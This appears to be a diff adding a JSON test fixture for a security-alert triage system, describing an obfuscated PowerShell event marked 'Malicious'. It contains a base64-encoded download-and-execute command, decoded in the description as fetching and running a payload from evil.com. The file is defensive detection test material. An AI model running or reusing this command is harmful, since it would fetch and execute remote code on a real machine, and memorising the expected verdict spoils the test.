@@ -1,0 +1,11 @@
+{
+  "alert_id": "DEMO-PS-002",
+  "timestamp": "2026-04-12T03:14:22Z",
+  "source_ip": "10.0.2.50",
+  "destination_ip": "10.0.2.50",
+  "event_type": "Obfuscated PowerShell",
+  "severity": "High",
+  "payload": "Windows PowerShell: EventID 4104; ScriptBlockText: powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA",
+  "expected_verdict": "Malicious",
+  "scenario_description": "Base64-encoded PowerShell (-enc) with -NoP -W Hidden flags. Decodes to IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')."
+}
